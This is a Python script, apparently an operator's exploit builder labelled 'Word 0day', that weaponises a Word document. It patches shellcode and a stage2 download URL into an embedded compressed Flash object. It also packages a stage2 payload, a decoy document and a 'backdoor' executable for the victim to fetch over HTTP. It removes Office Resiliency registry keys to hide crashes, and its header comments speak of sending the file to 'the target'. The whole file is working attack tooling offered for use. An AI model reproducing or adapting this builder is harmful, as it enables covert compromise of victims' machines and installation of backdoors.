#################################################################################
#
#    CONFIDENTIAL CODE - DISTRIBUTION OR REPRODUCTION IS STRICTLY FORBIDDEN
#
#################################################################################

# DO NOT MODIFY THIS FILE
# DO NOT SEND THIS FILE TO THE TARGET
# SEND ONLY THE GENERATED DOC FILE
import os, sys, struct, datetime, traceback
import zlib
import binascii
import zipfile
import warnings


if "." not in sys.path: sys.path.append(".")

from resources import compressedfile
from resources import stage2
from resources import stage1
#from resources import exploitdat

localbackdoor = None

DESCRIPTION = "Word 0day"
VERSION = "1.0"

Shellcode = ""
zip_tmp = ""

def error(msg):
    df = open("error.log", "a")
    msg = "[{0}] {1}\n".format(datetime.datetime.now().isoformat()[:19].replace("T", " "), msg)
    df.write(msg)
    traceback.print_exc(file=df)
    df.close()

class options():
	def __init__(self, baseurl, executable, stage2, document_to_display):
		# Change this mode according to exploit (office|adobe)
		self.mode = "office"

		# Use exploit file exploit.py in the exploit directory
		self.exploit_path = os.path.join(os.path.join(os.getcwd(), "DoNotModify"), "exploit.py")
		self.www = baseurl
		# settings exploit-independent
		self.url_executable = baseurl + executable
		self.url_stage2 = baseurl + stage2
		self.stage2_name = stage2
		self.use_adv = False        
		self.extra_args = []
		self.command = "none"

		# Fill default options according to mode
		if self.mode == "office":

			print "Entering in office mode"
			
			self.url_doc = baseurl + document_to_display
			self.result_name = document_to_display
			self.delete_keys = True

			# Advanced options
			self.local_exe = executable
			self.local_doc = document_to_display
			self.timeout = 1
			self.flags = "/q"

			# Specific extra command FOURCC in [ regs, none ]
			self.command = "regs"

			# arguments (leave empty array if no extra arguments [] )
			# predefined keys are [ HKCR | HKCC | HKCU | HKLS | HKLM | HKPD | HKPN | HKPT | HKUS ]:

			self.extra_args = [  
				"HKCU\\Software\\Microsoft\\Office\\10.0\\Word\\Resiliency",
				"HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Resiliency",
				"HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Resiliency",
				"HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Resiliency" ]

			# These advanced options CAN be changed by the user. Other ones will remain disabled.
			self.options_avail = [ 
				"local_exe", 
				"local_doc",
				"timeout",
				"flags",
			]

		elif (self.mode == "adobe"):

			self.url_doc = "http://www.yourwebser.com/document_to_display.pdf"
			self.result_name = "document_to_send.pdf"
			self.delete_keys = False        

			# Advanced options
			self.local_exe = "a.exe"
			self.local_doc = "<same as malicious document name>"
			self.timeout = 1
			self.flags = "/N"        

			# These advanced options CAN be changed by the user. Other ones will remain disabled.
			self.options_avail = [ 
				"local_exe",
				"local_doc",
				"timeout" ,
				"flags" ,
			]

	def _exploit_(self):
		""" Before loading the module """

		if self.mode == "office":

			sys.argv = [ self.exploit_path, os.path.join(os.path.dirname(self.exploit_path), "exploit.dat"), os.path.join(self.result_path, self.result_name) ]
			sys.path += [ os.path.dirname(self.exploit_path) ]

			#sys.argv = [ self.exploit_path, os.path.join(self.result_path, self.result_name)]
			#sys.path += [ os.path.dirname(self.exploit_path) ]            

		elif self.mode == "adobe":

			sys.argv = [ self.exploit_path, "b.iff", os.path.join(self.result_path, self.result_name) ]
			sys.path += [ os.path.dirname(self.exploit_path) ]            

		return True


def _invoke_exploit(o, zip):
	""" This method will generate the malicious file into the selected directory. """
	global Shellcode
	
	print "Shellcode parameters\n\tstage1: %d\n\tstage2 url: %s" %(len(stage1), o.url_stage2)
	Shellcode = b"".join([b"\x90\x90", stage1, o.url_stage2.encode() ]) + b"\x00"

        
def _create_stage2(o, zip):

	with warnings.catch_warnings():
		warnings.simplefilter('ignore')
		df_tmp = os.tempnam()

	# Patch dynamically this value 0x00010000 with timeout (in milliseconds)
	# Sleep: D0 EB DC 68 \/00 00 01 00\/ FF 55 A4

	payload = stage2[:41*16+1] + struct.pack("<I", o.timeout * 1000) + stage2[41*16+1+4:]

	payload = b"\x00".join( [ payload, o.local_exe.encode(), o.local_doc.encode(), o.url_executable.encode(), o.url_doc.encode(), o.flags.encode() ])
	payload = b"\x00".join( [ payload, o.command.encode() ])

	if len(o.extra_args) > 0 and o.command == "regs":
		payload = payload + struct.pack("<I", len(o.extra_args))

		keys = { 'HKCR' : 0x80000000, 'HKCC' : 0x80000005, 'HKCU' : 0x80000001, 'HKLS' : 0x80000007,
				 'HKLM' : 0x80000002, 'HKPD' : 0x80000004, 'HKPN' : 0x80000060, 'HKPT' : 0x80000050, 'HKUS' : 0x80000003 }

		payload += b"\x00".join( [ struct.pack("<I", keys[arg[:4]]) + arg[5:].encode() for arg in o.extra_args ])
	else:
		payload = payload + struct.pack("<I", 0)

	payload += b"\x00"             

	df = open(df_tmp, 'wb')
	df.write(payload)
	df.close()

	zip.write(df_tmp, o.stage2_name)
	
	try:
		os.unlink(df_tmp)
	except WindowsError:
		print "I/O error when deleting temp. files"


def byteArray2String(param):
	with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp = os.tempnam()

	f = open(tmp, 'wb')
	f.write(param)
	f.close()
	
	f = open(tmp, 'rb')
	result = f.read()
	f.close()
	
	try:
		os.unlink(tmp)
	except WindowsError:
		print "I/O error when deleting %s file"%(tmp)
	
	return result
	
def makedocfile(o, zip, documentname):

	fd = open("resources/exploit.dat", "rb")
	exploitdat = fd.read()
	fd.close()
	
	data_dec = bytearray(exploitdat[8:])
	
	offset = 0
	
	for i in range(len(data_dec)):
		if (data_dec[i:i+4] == b"9191"):
			offset = i
			break
	
	#data_dec = bytearray(zlib.decompress(exploitdat[8:]))
	#for i in range(len(data_dec)):
	#	if (data_dec[i:i+4] == b"9191"):
	#		offset = i
	#		break

	print "Shellcode length: %d" %(len(Shellcode))
	_Shellcode = binascii.hexlify(Shellcode)
	
	for i in range(len(_Shellcode)):
		data_dec[offset+i] = _Shellcode[i]

	#data_dec = byteArray2String(data_dec)
	#data_cmp = zlib.compress(data_dec, zlib.Z_BEST_COMPRESSION)

	xdata_dec = byteArray2String(data_dec)
	
	swf_cmp = zlib.compress(''.join(xdata_dec), zlib.Z_BEST_COMPRESSION)

	evilbuff = bytearray(zlib.decompress(compressedfile))
	offset = 0x4008
	for i in range(4):
		evilbuff[offset + i] = b"\x43\x57\x53\x0D"[i]

	evilbuff[offset + 4] = (len(data_dec)+8) % 0x100
	evilbuff[offset + 5] = ((len(data_dec)+8)>>8) % 0x100
	evilbuff[offset + 6] = ((len(data_dec)+8)>>16) % 0x100
	
	for i in range(len(swf_cmp)):
		evilbuff[offset + 8 +i] = swf_cmp[i]
	
	#evilbuff = compressedfile #bytearray(zlib.decompress(compressedfile))
	
	#evilbuff = evilbuff.replace("{SHELLCODE}", _Shellcode)
	#offset = 0x4008
	
	#for i in range(4):
	#	evilbuff[offset + i] = b"\x43\x57\x53\x0D"[i]

	#evilbuff[offset + 4] = (len(data_dec)+8) % 0x100
	#evilbuff[offset + 5] = (len(data_dec)+8) // 0x100
	#for i in range(len(data_cmp)):
	#	evilbuff[offset + 8 +i] = data_cmp[i]

	
	with warnings.catch_warnings():
		warnings.simplefilter('ignore')
		file_tmp = os.tempnam()
		
	f = open(file_tmp,mode='wb')
	f.write(evilbuff)
	f.close()    
	
	zip.write(file_tmp, documentname)
	
	try:
		os.unlink(file_tmp)
	except WindowsError:
		print "I/O error when deleting temp. files"

def makefile(url, output, documentforzip, documentname, backdoorpath):
	
	endslash = url.rfind('/')
	documentname = documentname.lower()	# convert in lowercase
	
	if documentname.find(' ') != -1:
		print "Document name cannot contain spaces."
		sys.exit(-1)
	
	if documentname.find('.docx') != -1:
		document2download = documentname
		documentname = documentname.replace('.docx', '.doc')
	else:
		document2download = documentname.replace('.doc', '_.doc')
	
	# __init__(self, baseurl, executable, stage2, document_to_display):
	o = options(url[0:endslash+1], documentname+"3", documentname+"2", document2download)
		
	with warnings.catch_warnings():
		warnings.simplefilter('ignore')
	#	zip_tmp = os.tempnam()
		
	# Create server.zip
	serverzip = zipfile.ZipFile(zip_tmp, "w", zipfile.ZIP_DEFLATED)
	_create_stage2(o, serverzip)
	
	serverzip.write(documentforzip, document2download)
	serverzip.write(backdoorpath, o.local_exe)
	serverzip.close()
	
	# Create the output archive
	print "Creating %s zip file archive"%(output)
	zip = zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED)
	
	_invoke_exploit(o, zip)
	makedocfile(o, zip, documentname)
	
	#zip.write(zip_tmp, "server.zip")
	
	zip.close()


if __name__=='__main__':
	dbg = False
	http = False
	
	print "Arguments in command line %d" %(len(sys.argv))
	for i in range(len(sys.argv)):
		print "Param %d : %s" %(i, sys.argv[i])
	
	if len(sys.argv) < 8:
		print "[ERROR] %s require 6 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http]} [urltodownload] outputzip inputdocument namedocument backdoor serverzip"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(1)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
		else:
			print "[ERROR] Unsupported payload method {http}"
			sys.exit(1)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[2]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[2]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	zip_tmp = sys.argv[7]
	
	#makefile(url, output, documentforzip, documentname, backdoorpath):	
	makefile(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6])
		
	print ' ... done'